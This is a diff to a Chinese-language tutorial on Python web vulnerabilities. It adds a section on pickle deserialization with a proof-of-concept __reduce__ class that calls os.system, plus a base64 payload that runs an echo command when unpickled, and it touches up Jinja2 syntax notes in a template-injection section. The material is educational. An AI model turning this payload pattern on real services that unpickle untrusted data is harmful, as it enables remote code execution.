@@ -12,11 +12,51 @@ categories = ["教程&文档"]
 image = "cover.png"
 +++
 ## Python反序列化漏洞
----
+> Python 反序列化漏洞是指攻击者通过构造恶意的序列化数据，利用 Python 的 `pickle` 模块或其他序列化库，在服务器端执行任意代码或获取敏感信息的漏洞。Python 的 `pickle` 模块允许将 Python 对象转换为字节流（序列化），并可以将字节流转换回原始对象（反序列化）。
 
-## Python代码注入
----
+### 漏洞产生的原因
+- **pickle ?**
+pickle 是一种栈语言，有不同的编写方式，基于一个轻量的 PVM（Pickle Virtual Machine）。python能够实现的功能它也能实现。
+- **pickle 的特性**
+pickle 模块是为了简化对象的存储和传输而设计，其在反序列化时会重构对象，其中会调用对象的特殊方法，如 __reduce__ 或 __setstate__。这些方法在序列化协议中被用来决定如何重构对象。
 
+| 序号 | 特殊方法             | 说明 |
+|------|--------------------|------|
+| 1    | **`__new__`**          | 在反序列化过程中，`__new__` 用于创建对象实例（分配内存），通常在对象的具体状态填充前被调用。 |
+| 2    | **`__getnewargs__`**   | 当对象的 `__new__` 需要额外的构造参数时，若定义了该方法，它会返回一个包含这些参数的元组，这些参数将传递给 `__new__`。 |
+| 3    | **`__reduce__`**       | 该方法返回一个元组，描述如何重构该对象。通常该元组包括一个可调用对象、其参数，及（可选）对象的状态信息。虽然主要用于序列化，但它提供的信息会直接影响反序列化时对象的重构过程。 |
+| 4    | **`__reduce_ex__`**    | 与 `__reduce__` 类似，但该方法接收协议版本参数，能够根据不同的 pickle 协议返回不同的重构信息，是新版 pickle 推荐使用的接口。 |
+| 5    | **`__getstate__`**     | 在序列化时会调用，用于获取对象的状态（如对象的属性字典）。反序列化时，这部分状态通常会传递给 `__setstate__`。注意：反序列化过程中并不会直接调用 `__getstate__`。 |
+| 6    | **`__setstate__`**     | 在反序列化时调用，根据 `__getstate__` 得到的数据恢复或更新对象的内部状态。 |
+
+- **reduce 方法和任意函数调用**
+当对象实现了 __reduce__ 方法时，该方法返回一个元组，通常形式为 (callable, args)。在反序列化时，pickle 会调用这个可调用对象，并传入参数 args 来构造对象。攻击者可以利用这一特性来返回任意可调用的函数，比如 os.system，并指定恶意命令作为参数。这样一来，当 pickle.load() 被调用时，恶意函数就会被执行。
+
+生成 Payload
+```python
+import pickle
+import os
+from base64 import b64encode, b64decode
+class ExploitReduce:
+    def __reduce__(self):
+        # 返回一个元组，第一个元素是可调用对象 os.system，
+        # 第二个元素是一个包含命令的元组，反序列化时将调用 os.system('echo "Exploited via __reduce__!"')
+        return (os.system, ('echo "Exploited via __reduce__ method!"',))
+
+malicious_payload = pickle.dumps(ExploitReduce())
+print("生成的 pickle 数据:", b64encode(malicious_payload))
+```
+执行
+```python
+import pickle
+from base64 import b64encode, b64decode
+token = "gASVQgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCdlY2hvICJFeHBsb2l0ZWQgdmlhIF9fcmVkdWNlX18gbWV0aG9kISKUhZRSlC4="
+token = pickle.loads(b64decode(token))
+```
+可以看到执行了 `echo "Exploited via __reduce__ method!"` 命令。
+![](image-9.png)
+### 为什么 执行时并没有导入 os 模块？
+在序列化时（pickle.dumps()），将 ExploitReduce 类的实例转换为字节流。pickle 在反序列化时会自动导入所需的模块和类，因此在生成 payload 时不需要手动导入 os 模块。
 ## 网页模板渲染漏洞
 > SSTI 是  Server-Side Template Injection 的缩写，意为服务端模板注入。它是指攻击者通过在输入中注入恶意代码，来操控服务器端的模板引擎，从而执行任意代码或获取敏感信息的攻击方式。SSTI 漏洞通常出现在使用模板引擎渲染网页的应用程序中，例如 Flask、Django、Jinja2 等。
 
@@ -37,13 +77,13 @@ image = "cover.png"
 > Jinja2 是一个现代的、设计优雅的 Python 模板引擎，常用于 Flask 等 Web 框架中。它允许开发者在 HTML 模板中嵌入 Python 代码，从而动态生成网页内容。Jinja2 的语法简单易懂，支持控制结构、过滤器和宏等功能，使得模板的编写和维护变得更加灵活和高效。
 
 #### Jinja2 的基本语法
-- 变量：使用 `{{ variable }}` 来输出变量的值。
-- 控制结构：使用 `{% ... %}` 来编写控制结构，如循环和条件语句。
-- 过滤器：使用 `{{ variable | filter }}` 来对变量进行处理，如格式化日期、转换大小写等。
-- 注释：使用 `{# ... #}` 来添加注释，这些注释不会被渲染到最终的输出中。
-- 宏：使用 `{% macro name(args) %} ... {% endmacro %}` 来定义可重用的代码块，类似于函数。
-- 继承：使用 `{% extends "base.html" %}` 来继承其他模板，使用 `{% block content %} ... {% endblock %}` 来定义可重写的内容块。
-
+- **变量**：使用 `{{ variable }}` 来输出变量的值。
+- **控制结构**：使用 `{% ... %}` 来编写控制结构，如循环和条件语句。
+- **过滤器**：使用 `{{ variable | filter }}` 来对变量进行处理，如格式化日期、转换大小写等。
+- **注释**：使用 `{# ... #}` 来添加注释，这些注释不会被渲染到最终的输出中。
+- **宏**：使用 `{% macro name(args) %} ... {% endmacro %}` 来定义可重用的代码块，类似于函数。
+- **继承**：使用 `{% extends "base.html" %}` 来继承其他模板，使用 `{% block content %} ... {% endblock %}` 来定义可重写的内容块。
+- **管道**：使用 `{{ variable | filter1 | filter2 }}` 来对变量应用多个过滤器，过滤器按从左到右的顺序应用。
 示例模板：
 ```html
 <!DOCTYPE html>
